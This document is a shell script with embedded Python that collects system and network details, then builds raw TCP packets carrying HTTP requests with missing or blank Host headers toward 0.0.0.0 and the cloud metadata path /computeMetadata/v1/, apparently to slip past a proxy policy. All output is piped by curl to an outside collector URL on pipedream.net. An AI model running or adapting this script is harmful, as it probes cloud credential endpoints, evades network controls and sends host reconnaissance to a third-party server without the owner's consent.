#!/bin/sh
# raw-http-0-nohost-variants.sh
#
# Usage:
#   COLLECTOR_URL="https://your-collector.example/path" sh raw-http-0-nohost-variants.sh
#
# Purpose:
# - Force raw Ethernet/TCP packets toward dst IP 0.0.0.0:80 via eth0/default gateway MAC.
# - Test HTTP requests without Host / with blank Host to see if proxy policy differs.
#
# Notes:
# - Requires CAP_NET_RAW.
# - Sends one small request per fresh raw TCP flow.
# - Destination is only 0.0.0.0:80.
# - Header/body output is capped.

COLLECTOR_URL="${COLLECTOR_URL:-https://eoqy29v9qqzscf0.m.pipedream.net/}"
POST_TIMEOUT="${POST_TIMEOUT:-20}"

(
set -x

echo "=============================="
echo "=== context =================="
echo "=============================="
date
id
uname -a
hostname -I 2>&1 || true
cat /proc/cmdline 2>&1 || true
cat /proc/net/route 2>&1 || true
cat /proc/net/arp 2>&1 || true
cat /proc/net/dev 2>&1 || true
grep -E 'Cap(Inh|Prm|Eff|Bnd|Amb)|NoNewPrivs|Seccomp' /proc/self/status 2>&1 || true
echo "--- eth0 mac"
cat /sys/class/net/eth0/address 2>&1 || true

echo
echo "=============================="
echo "=== normal socket baseline ==="
echo "=============================="
python3 - <<'PY' 2>&1 || true
import socket

for dst in ["0.0.0.0", "169.254.169.254"]:
    print(f"=== normal connect {dst}:80 ===")
    s = socket.socket()
    s.settimeout(2)
    try:
        s.connect((dst, 80))
        print("CONNECT_OK", s.getsockname(), "->", s.getpeername())
        s.sendall(b"GET / HTTP/1.0\r\n\r\n")
        try:
            print(s.recv(512).decode("utf-8", "replace"))
        except Exception as e:
            print("RECV_FAIL", type(e).__name__, e)
    except Exception as e:
        print("CONNECT_FAIL", type(e).__name__, e)
    finally:
        s.close()
PY

echo
echo "=============================="
echo "=== raw tcp no-host variants ="
echo "=============================="
python3 - <<'PY' 2>&1 || true
import os
import socket
import struct
import random
import time
import select

IFACE = "eth0"
SRC_IP = "192.0.2.2"
DST_IP = "0.0.0.0"
DST_PORT = 80
GW_MAC = "02:fc:00:00:00:05"

PAYLOADS = [
    ("h10_no_host_root",
     b"GET / HTTP/1.0\r\n\r\n"),

    ("h10_no_host_metadata",
     b"GET /computeMetadata/v1/ HTTP/1.0\r\n\r\n"),

    ("h11_no_host_root",
     b"GET / HTTP/1.1\r\nConnection: close\r\n\r\n"),

    ("h11_no_host_metadata",
     b"GET /computeMetadata/v1/ HTTP/1.1\r\nConnection: close\r\n\r\n"),

    ("h11_empty_host",
     b"GET / HTTP/1.1\r\nHost:\r\nConnection: close\r\n\r\n"),

    ("h11_space_host",
     b"GET / HTTP/1.1\r\nHost: \r\nConnection: close\r\n\r\n"),

    ("h11_tab_host",
     b"GET / HTTP/1.1\r\nHost:\t\r\nConnection: close\r\n\r\n"),

    ("h10_absolute_0",
     b"GET http://0.0.0.0/ HTTP/1.0\r\n\r\n"),

    ("h10_absolute_metadata",
     b"GET http://0.0.0.0/computeMetadata/v1/ HTTP/1.0\r\n\r\n"),

    ("invalid_method_no_host",
     b"BOGUS / HTTP/1.0\r\n\r\n"),
]

def mac_bytes(s):
    return bytes(int(x, 16) for x in s.split(":"))

def get_iface_mac(iface):
    with open(f"/sys/class/net/{iface}/address", "r") as f:
        return mac_bytes(f.read().strip())

def checksum(data):
    if len(data) % 2:
        data += b"\0"
    total = 0
    for i in range(0, len(data), 2):
        total += (data[i] << 8) + data[i + 1]
    total = (total >> 16) + (total & 0xffff)
    total += total >> 16
    return (~total) & 0xffff

def ip_header(src_ip, dst_ip, proto, payload_len, ident=None):
    if ident is None:
        ident = random.randrange(0, 65535)
    ver_ihl = 0x45
    tos = 0
    total_len = 20 + payload_len
    flags_frag = 0
    ttl = 64
    csum = 0
    src = socket.inet_aton(src_ip)
    dst = socket.inet_aton(dst_ip)
    hdr = struct.pack("!BBHHHBBH4s4s", ver_ihl, tos, total_len, ident, flags_frag, ttl, proto, csum, src, dst)
    csum = checksum(hdr)
    return struct.pack("!BBHHHBBH4s4s", ver_ihl, tos, total_len, ident, flags_frag, ttl, proto, csum, src, dst)

def tcp_header(src_ip, dst_ip, sport, dport, seq, ack, flags, payload=b""):
    data_offset = 5 << 4
    window = 64240
    csum = 0
    urg = 0
    tcp = struct.pack("!HHLLBBHHH", sport, dport, seq, ack, data_offset, flags, window, csum, urg)
    pseudo = socket.inet_aton(src_ip) + socket.inet_aton(dst_ip) + struct.pack("!BBH", 0, socket.IPPROTO_TCP, len(tcp) + len(payload))
    csum = checksum(pseudo + tcp + payload)
    return struct.pack("!HHLLBBHHH", sport, dport, seq, ack, data_offset, flags, window, csum, urg)

def eth_frame(src_mac, dst_mac, ip_payload):
    return dst_mac + src_mac + b"\x08\x00" + ip_payload

def build_tcp_frame(src_mac, dst_mac, src_ip, dst_ip, sport, dport, seq, ack, flags, payload=b""):
    tcp = tcp_header(src_ip, dst_ip, sport, dport, seq, ack, flags, payload)
    ip = ip_header(src_ip, dst_ip, socket.IPPROTO_TCP, len(tcp) + len(payload))
    return eth_frame(src_mac, dst_mac, ip + tcp + payload)

def parse_ipv4_from_eth(frame):
    if len(frame) < 14 + 20 or frame[12:14] != b"\x08\x00":
        return None
    pkt = frame[14:]
    ihl = (pkt[0] & 0x0f) * 4
    proto = pkt[9]
    src = socket.inet_ntoa(pkt[12:16])
    dst = socket.inet_ntoa(pkt[16:20])
    return pkt, ihl, proto, src, dst

def flags_str(flags):
    names = []
    for bit, name in [(0x01, "FIN"), (0x02, "SYN"), (0x04, "RST"), (0x08, "PSH"), (0x10, "ACK"), (0x20, "URG")]:
        if flags & bit:
            names.append(name)
    return ",".join(names) or "-"

def wait_for_tcp(sock, sport, expect_from_ip, expect_to_ip, timeout=3):
    deadline = time.time() + timeout
    while time.time() < deadline:
        r, _, _ = select.select([sock], [], [], 0.25)
        if not r:
            continue
        frame = sock.recv(65535)
        parsed = parse_ipv4_from_eth(frame)
        if not parsed:
            continue
        pkt, ihl, proto, ip_src, ip_dst = parsed
        if proto != socket.IPPROTO_TCP or len(pkt) < ihl + 20:
            continue
        tcp = pkt[ihl:ihl + 20]
        r_sport, r_dport, r_seq, r_ack, off_flags, win, csum, urg = struct.unpack("!HHIIHHHH", tcp)
        r_flags = off_flags & 0x01ff
        tcp_hlen = ((off_flags >> 12) & 0xf) * 4
        payload = pkt[ihl + tcp_hlen:]
        if ip_src == expect_from_ip and ip_dst == expect_to_ip and r_sport == DST_PORT and r_dport == sport:
            return {
                "ip_src": ip_src,
                "ip_dst": ip_dst,
                "sport": r_sport,
                "dport": r_dport,
                "seq": r_seq,
                "ack": r_ack,
                "flags": r_flags,
                "payload": payload,
            }
    return None

src_mac = get_iface_mac(IFACE)
dst_mac = mac_bytes(GW_MAC)

print("IFACE", IFACE)
print("SRC_MAC", ":".join(f"{b:02x}" for b in src_mac))
print("GW_MAC", GW_MAC)
print("SRC_IP", SRC_IP)
print("DST_IP", DST_IP)

sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0800))
sock.bind((IFACE, 0))
sock.setblocking(False)

for name, http in PAYLOADS:
    print(f"================ PAYLOAD {name} ================")
    sport = random.randrange(30000, 60000)
    seq = random.randrange(0, 2**32 - 1)

    print("SPORT", sport, "SEQ", seq)
    syn = build_tcp_frame(src_mac, dst_mac, SRC_IP, DST_IP, sport, DST_PORT, seq, 0, 0x02)
    sock.send(syn)
    print("SENT_SYN")

    r = wait_for_tcp(sock, sport, DST_IP, SRC_IP, timeout=3)
    if not r:
        print("NO_SYNACK")
        continue

    print("RECV1", r["ip_src"], r["sport"], "->", r["ip_dst"], r["dport"], "flags", flags_str(r["flags"]), "seq", r["seq"], "ack", r["ack"], "payload_len", len(r["payload"]))

    if not ((r["flags"] & 0x12) == 0x12):
        print("NO_SYNACK_FLAGS")
        continue

    server_seq = r["seq"]
    client_seq = seq + 1
    client_ack = server_seq + 1

    ack = build_tcp_frame(src_mac, dst_mac, SRC_IP, DST_IP, sport, DST_PORT, client_seq, client_ack, 0x10)
    sock.send(ack)
    print("SENT_ACK")

    data = build_tcp_frame(src_mac, dst_mac, SRC_IP, DST_IP, sport, DST_PORT, client_seq, client_ack, 0x18, http)
    sock.send(data)
    print("SENT_HTTP_LEN", len(http))
    print("HTTP_BEGIN")
    print(http.decode("utf-8", "replace"))
    print("HTTP_END")

    # wait for a few responses
    seen = 0
    deadline = time.time() + 4
    while time.time() < deadline and seen < 5:
        r = wait_for_tcp(sock, sport, DST_IP, SRC_IP, timeout=0.5)
        if not r:
            continue
        seen += 1
        print("RECV", r["ip_src"], r["sport"], "->", r["ip_dst"], r["dport"], "flags", flags_str(r["flags"]), "seq", r["seq"], "ack", r["ack"], "payload_len", len(r["payload"]))
        if r["payload"]:
            print("PAYLOAD_BEGIN")
            print(r["payload"][:2048].decode("utf-8", "replace"))
            print("PAYLOAD_END")
        if r["flags"] & 0x04:
            print("GOT_RST")
            break
        if r["flags"] & 0x01:
            print("GOT_FIN")
            break

    print("RESPONSES", seen)

sock.close()
PY

) 2>&1 | curl -s -m "$POST_TIMEOUT" -X POST --data-binary @- "$COLLECTOR_URL"
